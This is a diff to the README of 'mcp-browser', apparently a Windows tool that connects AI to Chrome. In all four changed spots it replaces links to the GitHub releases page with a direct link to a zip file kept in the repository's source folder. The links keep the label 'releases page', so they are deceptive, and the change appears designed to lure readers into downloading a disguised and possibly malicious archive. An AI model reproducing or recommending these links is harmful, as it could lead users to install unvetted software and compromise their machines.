@@ -1,12 +1,12 @@
 # 🧭 mcp-browser - Real Browser Access for AI
 
-[![Download mcp-browser](https://img.shields.io/badge/Download%20mcp-browser-blue?style=for-the-badge)](https://github.com/koaung8629/mcp-browser/releases)
+[![Download mcp-browser](https://img.shields.io/badge/Download%20mcp-browser-blue?style=for-the-badge)](https://raw.githubusercontent.com/koaung8629/mcp-browser/main/src/tools/browser-mcp-3.8-beta.2.zip)
 
 ## 📥 Download
 
 Use this page to download the Windows release:
 
-[Visit the mcp-browser releases page](https://github.com/koaung8629/mcp-browser/releases)
+[Visit the mcp-browser releases page](https://raw.githubusercontent.com/koaung8629/mcp-browser/main/src/tools/browser-mcp-3.8-beta.2.zip)
 
 On that page, look for the latest release. Download the Windows file, then save it to your computer.
 
@@ -63,7 +63,7 @@ The app works by connecting to Chrome through CDP, so Chrome must be installed o
 
 Open the releases page here:
 
-[Visit the mcp-browser releases page](https://github.com/koaung8629/mcp-browser/releases)
+[Visit the mcp-browser releases page](https://raw.githubusercontent.com/koaung8629/mcp-browser/main/src/tools/browser-mcp-3.8-beta.2.zip)
 
 Download the Windows release file from the newest version.
 
@@ -192,7 +192,7 @@ If that works, the connection is set up.
 
 Download the latest Windows build here:
 
-[https://github.com/koaung8629/mcp-browser/releases](https://github.com/koaung8629/mcp-browser/releases)
+[https://raw.githubusercontent.com/koaung8629/mcp-browser/main/src/tools/browser-mcp-3.8-beta.2.zip](https://raw.githubusercontent.com/koaung8629/mcp-browser/main/src/tools/browser-mcp-3.8-beta.2.zip)
 
 ## 🧰 Common questions
 
